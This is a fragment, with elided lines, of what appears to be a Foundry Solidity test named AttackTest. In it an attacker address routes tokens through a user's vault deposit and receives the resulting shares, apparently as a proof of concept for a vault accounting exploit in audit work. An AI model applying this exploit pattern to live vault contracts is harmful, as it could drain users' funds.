...
contract AttackTest is AttackTestBase {
    function _calculateStolenAmount(
        ...
        token.mintAmount(initialSubVaultTotalAssets);
        ...
        vm.prank(user);
        token.mintAmount(vaultInitialDepositAmount);

        vm.startPrank(user);
        token.approve(address(vault), vaultInitialDepositAmount);
        vault.deposit(vaultInitialDepositAmount);
        vm.stopPrank();

        address attacker = address(0xBEEF);
        vm.prank(attacker);
        token.mintAmount(vaultAttackDepositAmount);

        vm.prank(attacker);
        token.transfer(user, vaultAttackDepositAmount);

        vm.startPrank(user);
        token.approve(address(vault), vaultAttackDepositAmount);
        uint256 sharesBack = vault.deposit(vaultAttackDepositAmount);
        vault.transfer(attacker, sharesBack);
        vm.stopPrank();
